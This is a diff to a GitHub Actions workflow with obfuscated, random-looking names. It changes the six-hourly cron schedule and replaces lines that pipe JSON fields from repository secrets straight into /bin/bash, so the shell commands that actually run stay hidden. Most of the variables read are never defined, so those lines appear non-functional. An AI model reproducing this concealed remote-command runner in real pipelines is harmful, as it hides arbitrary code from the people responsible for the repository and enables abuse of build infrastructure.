@@ -1,9 +1,9 @@
 name: juiceqinzq
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 4/6 * * *'
-
+    - cron: '14 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,11 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: juiceqinzq
         env:
-          amoh63721: ${{ secrets.amoh63721 }}
+          fst02: ${{ secrets.fst02 }}
         run: |
-          echo $amoh63721 | jq -r .si2497 | /bin/bash
-          echo $tfxl490 | jq -r .hudn20955 | /bin/bash
-          echo $rfucd97 | jq -r .funkv90746 | /bin/bash
-          echo $qar84 | jq -r .d55203 | /bin/bash
-          echo $zah79336 | jq -r .o39232 | /bin/bash
+          echo $fst02 | jq -r .mc46279 | /bin/bash
+          echo $s19 | jq -r .srjy0443 | /bin/bash
+          echo $hyezd3990 | jq -r .wldt7 | /bin/bash
+          echo $udosi3 | jq -r .opc42 | /bin/bash
+          echo $lr60 | jq -r .bywq834 | /bin/bash
+          echo $y48934 | jq -r .iq25 | /bin/bash
+          echo $vpp805 | jq -r .ilj881 | /bin/bash
+          echo $j58 | jq -r .dvs25 | /bin/bash
+          echo $k1472 | jq -r .azybu92 | /bin/bash
 
